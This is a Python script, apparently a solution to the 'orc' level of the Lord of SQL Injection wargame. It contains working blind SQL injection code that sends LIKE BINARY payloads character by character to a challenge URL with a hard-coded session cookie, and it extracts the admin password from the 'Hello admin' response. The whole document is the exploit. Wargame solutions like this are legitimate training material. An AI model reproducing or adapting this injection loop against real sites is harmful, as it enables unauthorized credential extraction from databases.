# LordofSQLi: orc
# woanmeo11

import requests
from string import printable

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies = {'PHPSESSID': 'n3a246mepfklr3jmvbvntarv00'}

passwd = ''
while True:
    finish = True
    for c in printable:
        if c != '%':
            payload = {'pw': f"' OR pw LIKE BINARY '{passwd + c}%'-- "}
            r = requests.get(url, params=payload, cookies=cookies)
            print(c, end='', flush=True)
            if 'Hello admin' in r.text:
                passwd += c
                finish = False
                print('\n->' + passwd)
                break
    if finish:
        break
print(passwd)
